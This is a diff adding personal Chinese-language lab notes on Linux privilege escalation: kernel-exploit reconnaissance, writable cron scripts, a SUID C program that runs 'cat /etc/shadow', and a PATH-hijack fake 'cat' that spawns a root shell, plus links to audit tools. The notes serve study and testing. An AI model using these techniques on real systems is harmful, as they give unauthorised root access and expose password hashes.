@@ -1,0 +1,97 @@
+在提权之前可以做好必要的提权信息收集
+参考：http://www.youknowi.xin/2018/11/linux%e7%9a%84%e6%94%bb%e5%87%bb%e5%92%8c%e6%b8%97%e9%80%8f%ef%bc%88%e5%86%85%e7%bd%91%e7%af%87%ef%bc%89/
+
+具体的几个操作
+参考：http://www.youknowi.xin/2018/09/linux%e6%8f%90%e6%9d%83%e5%92%8cwindows%e6%8f%90%e6%9d%83%ef%bc%88%e4%ba%8c%ef%bc%89/
+
+第一种，exp提权，ok，我分析了下
+
+uname -a
+
+cat /etc/issue
+
+cat /etc/*-release
+
+可以上传文件
+
+有文件执行权限
+
+有gcc（上一次搭建环境测试，就是因为gcc的版本不对，导致无法进行）
+
+（内核提权需谨慎）
+第二种 计划任务
+
+ls -l /etc/cron*
+
+默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连rootshell了。
+
+在本地进行测试时，并没有发现用户可以写的文件。
+第三种 SUID
+
+SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。比如passwd命令，就是以root权限运行来修改shadow的。
+
+find / -perm -u=s -type f 2>/dev/null
+
+2.（测试了下，成功的，要找到suid文件，注意是属于root下的）
+
+#include<stdlib.h>
+#include <unistd.h>
+ int main()
+ {
+setuid(0);//run as root
+system("id");
+system("cat /etc/shadow");
+}
+
+以root进行编译和权限设置
+
+gcc suid.c  -o suid-exp
+chmod 4755 ./suid-exp#这里设置了SUID位
+ls -l
+
+输出
+
+-rwsr-xr-x 1 root root 8632 Mar 15 20:53 suid-exp
+
+注意s属性，表示这个程序有SUID的属性。
+
+接下来我们切换用户并执行
+
+su test
+./suid-exp
+
+3.（测试没有输出来）
+
+SUID程序经常存在提权漏洞，比如nmap就曾出现过提权漏洞。低权用户通过打开nmap交互模式以root执行任意系统命令。而除了借助程序功能提权，我们还可以尝试劫持环境变量提权。上文的c程序使用了system函数，system函数是继承环境变量的，因此我们通过替换环境变量可以达到执行任意命令的效果。
+
+我们进入test低权用户的shell
+
+cat >> /tmp/cat <<EOF
+#!/usr/bin/python
+print "this is not the true cat"
+print "here is a root shell!"
+import pty;pty.spawn("/bin/sh")
+EOF
+# 这里我们在/tmp建立了假的cat，它会用python执行一个shell
+PATH=/tmp:$PATH#设置PATH，优先从/tmp查找程序
+./suid-exp#执行suid程序，因为PATH被劫持，system("cat /etc/shadow");会执行我们的假cat
+
+第四种 网络隐藏服务
+
+unix-privesc-check： http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+试了下，很强大
+
+下面两个暂时不去测试了
+
+linuxprivchecker： https://www.securitysift.com/download/linuxprivchecker.py
+
+这两个程序不止细致地检查了非常多的配置问题，更让人感动地列出了所有可写文件。基本上可以说他们的检查是足够全面的。
+
+手动检查 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+
+
+
+
+
